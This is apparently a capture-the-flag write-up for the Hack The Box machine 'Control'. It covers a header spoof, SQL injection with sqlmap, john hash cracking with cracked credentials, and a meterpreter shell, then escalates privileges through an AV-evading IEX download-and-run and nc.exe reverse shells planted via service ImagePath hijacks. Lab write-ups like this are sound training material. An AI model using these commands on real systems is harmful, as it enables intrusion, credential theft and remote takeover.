---
title: "Control"
date: 2020-04-25T15:32:15-04:00
draft: false 
---

Add to our /etc/hosts:

10.10.10.167      control.htb


Accessing /admin.php gives us an error which can be resolved by adding an X-forwarded-by: header like so:

X-forwarded-for: 192.168.4.28

We can have burpsuite automatically add this hearder to enhance our requests going forward.
Now that we can access the admin.php panel we can look for SQLi in the form. We find one in the productName field and pass the full request to sqlmap like so:

```bash
cat request-sqli

POST /search_products.php HTTP/1.1
Host: 10.10.10.167
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:73.0) Gecko/20100101 Firefox/73.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
Origin: http://10.10.10.167
Connection: close
Referer: http://10.10.10.167/admin.php
Upgrade-Insecure-Requests: 1
X-Forwarded-For: 192.168.4.28

productName=%27
```


```bash
sqlmap -r request-sqli -p productName --risk=3 --level=3 --os-shell 
```
```bash
sqlmap -r request-sqli -p productName --risk=3 --level=3 -D mysql -T user -C User,Password --dump
```

We can create a file and crack the hashes with john:  

```bash
cat passwords

*0E178792E8FC304A2E3133D535D38CAF1DA3CD9D
*0A4A5CAD344718DC418035A1F4D292BA603134D8
*0A4A5CAD344718DC418035A1F4D292BA603134D8
*0A4A5CAD344718DC418035A1F4D292BA603134D8
*0A4A5CAD344718DC418035A1F4D292BA603134D8

john --wordlist=/usr/share/wordlists/rockyou.txt passwords
```

```bash
john --show passwords
l33th4x0rhector
```

hector:l33th4x0rhector

spawn a web_delivery shell with php/meterpreter/reverse_tcp and then portfwd

you can also upload something like plink.exe to get a portfwd going on the box

```bash
portfwd add -l 5985 -p 5985 -r 10.10.10.167

evil-winrm -i 127.0.0.1 -u hector -p l33th4x0rhector
```

read hectors recent powershell activity with:  

```powershell
type C:\Users\Hector\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

we can bypass AV to run powerup invoke-all checks by hosting our own python3 webserver and having the powerup.ps1 filename obfuscated like so:

```bash
ls
cp PowerUp.ps1 blah.ps1
python3 -m http.server
```

on target:

```powershell
powershell -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘http://10.10.14.8:8000/blah.ps1’); Invoke-AllChecks”
```

Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\   | format-list

```powershell
cd C:\Windows\Temp
upload nc.exe
```


get web_delivery via:



setup: nc -lvp 2345

```powershell
$regKeys = get-childItem "HKLM:\SYSTEM\CurrentControlSet\services" -name
$baseCommand="HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\"
foreach ($regKeyName in $regKeys) {reg add "$($baseCommand) + $($regKeyName)" /t REG_EXPAND_SZ /v ImagePath /d "C:\Windows\Temp\nc.exe -e powershell 10.10.14.8 2345" /f}
foreach($regKeyName in $regKeys){sc start $regKeyName}
```

or you can do

```powershell
reg add HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\wuauserv /t REG_EXPAND_SZ /v ImagePath /d "C:\Windows\Temp\nc.exe -e powershell 10.10.14.8 2345"  /f

sc start wuauserv
```

root flag
8f8613f5b4da391f36ef11def4cec1b1

